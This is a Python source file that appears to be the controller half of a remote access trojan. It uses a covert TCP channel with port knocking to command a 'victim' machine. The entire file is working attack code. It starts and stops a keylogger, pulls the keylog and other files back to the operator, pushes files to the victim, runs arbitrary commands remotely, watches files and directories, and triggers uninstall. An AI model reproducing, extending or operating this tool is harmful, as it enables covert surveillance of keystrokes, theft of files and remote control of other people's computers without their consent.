import argparse
from watcher import *
from covertTCP import *


def make_dir(ip):
    """
    Makes a directory with the ip
    :param ip: ip of the client
    :return:
    """
    directory = 'downloads' + '/' + ip + "/watching"
    os.makedirs(directory, exist_ok=True)
    directory = 'downloads' + '/' + ip + "/deleted"
    os.makedirs(directory, exist_ok=True)
    return directory


def display_menu():
    print(f"\n===============MENU OPTIONS===============\n"
          f"1. Start Keylogger\n2. Stop Keylogger\n3. Transfer Keylog File\n4. Transfer File To\n"
          f"5. Transfer File From\n6. Run Program\n7. Watch File\n8. Watch Directory\n9. Stop Watching File\n"
          f"10.Stop Watching Directory\n11.Disconnect\n12.Uninstall", end="\n\n")


def watching(covert):
    while True:
        covert.receive_data(is_victim=False)


def handle_victim(covert: CovertTCP):
    make_dir(covert.victim_addr)
    watcher_instance = Watcher()
    while True:
        input("Press ENTER to continue")
        display_menu()
        try:
            choice = int(input("Choose an Option from above:"))
        except ValueError:
            print("[UNEXPECTED INPUT] Try Again\n\n")
            continue

        covert.cmd = choice
        covert.send_data(is_victim=True)
        covert.cmd = None

        if choice == 3:
            sig = int(covert.receive_data(is_victim=False))
            if sig == 1:
                print(f"[BAD COMMAND] Keylogger should be Stopped before transferring keylog.txt")
                continue
            elif sig == 2:
                print(f"[FILE ERROR] keylog.txt does not exist.")
                continue
            covert.receive_data(is_victim=False)

        elif choice == 4:
            file = input(f"Write the name of file you want to send: ")
            i = check_exists(file)
            if not i:
                print(f"[ERROR: File does not exist] wrong file path")
                covert.cmd = 0
                covert.send_data(is_victim=True)
                covert.cmd = None
                continue
            covert.cmd = 1
            covert.send_data(is_victim=True)
            covert.cmd = None
            covert.file_name = file
            covert.send_data(is_victim=True, event="IN_CREATE")
            covert.file_name = None

        elif choice == 5:
            file = input(f"Write the name of file you want: ")
            covert.cmd = file
            covert.send_data(is_victim=True)
            covert.cmd = None
            sig = int(covert.receive_data(is_victim=False))
            if not sig:
                print(f"[ERROR: File does not exist] wrong file path")
                continue
            covert.receive_data(is_victim=False, watching=False)

        elif choice == 6:
            program_name = input("Enter the command to run: ")
            covert.cmd = program_name
            covert.send_data(is_victim=True)
            covert.cmd = None
            res = covert.receive_data(is_victim=False)
            if not res:
                print(f"[ERROR] Could not execute the command. ")
            else:
                print(f"{res}")
        elif choice == 7:
            file = input(f"Write the name of file you want to watch: ")
            covert.cmd = file
            covert.send_data(is_victim=True)
            covert.cmd = None
            sig = int(covert.receive_data(is_victim=False))
            if not sig:
                print(f"[ERROR: File does not exist] wrong file path")
                continue

            if not watcher_instance.get_status():
                watcher_instance.toggle_file()
                watcher_instance.toggle_status()
                file_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
                file_watching_process.start()
                print(f"[WATCH STARTED] on {file}")
                watcher_instance.set_child(file_watching_process)
            else:
                if not watcher_instance.watching_dir_or_file():
                    print(f"[ERROR] Watching a File already")
                elif watcher_instance.watching_dir_or_file():
                    print(f"[ERROR] Watching a Directory already")

        elif choice == 8:
            direc = input(f"Write the path of directory you want to watch: ")
            covert.cmd = direc
            covert.send_data(is_victim=True)
            covert.cmd = None
            sig = int(covert.receive_data(is_victim=False))
            if not sig:
                print(f"[ERROR: Directory does not exist] wrong dir path")
                continue
            if not watcher_instance.get_status():
                watcher_instance.toggle_dir()
                watcher_instance.toggle_status()
                dir_watching_process = multiprocessing.Process(target=watching, args=(covert, ))
                dir_watching_process.start()
                print(f"[WATCH STARTED] on {direc}")
                watcher_instance.set_child(dir_watching_process)
            else:
                if not watcher_instance.watching_dir_or_file():
                    print(f"[ERROR] Watching a File already")
                elif watcher_instance.watching_dir_or_file():
                    print(f"[ERROR] Watching a Directory already")

        elif choice == 9:
            if watcher_instance.get_status() and not watcher_instance.watching_dir_or_file():
                watcher_instance.stop_watching()
            elif not watcher_instance.get_status():
                print("[ERROR] Watcher instance is not running")
            elif watcher_instance.watching_dir_or_file():
                print("[ERROR] Watching a Directory right now")

        elif choice == 10:
            if watcher_instance.get_status() and watcher_instance.watching_dir_or_file():
                watcher_instance.stop_watching()
            elif not watcher_instance.get_status():
                print("[ERROR] Watcher instance is not running")
            elif not watcher_instance.watching_dir_or_file():
                print("[ERROR] Watching a File right now")

        elif choice == 11 or choice == 12:
            print(f"[DISCONNECTING]")
            break


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', dest='ip', type=str, required=True)
    parser.add_argument('-dport', '--dest_port', type=int, dest='dst_port', default=66)
    parser.add_argument('-sport', '--src_port', type=int, dest='src_port', default=1200)
    args = parser.parse_args()

    covert_instance = CovertTCP(cmd_addr=get_ip_address(),
                                cmd_port=args.src_port,
                                victim_addr=args.ip,
                                victim_port=args.dst_port)
    covert_instance.port_knock()
    print(f"Encryption Key: {covert_instance.key.decode('ascii')}")
    handle_victim(covert_instance)


if __name__ == "__main__":
    main()
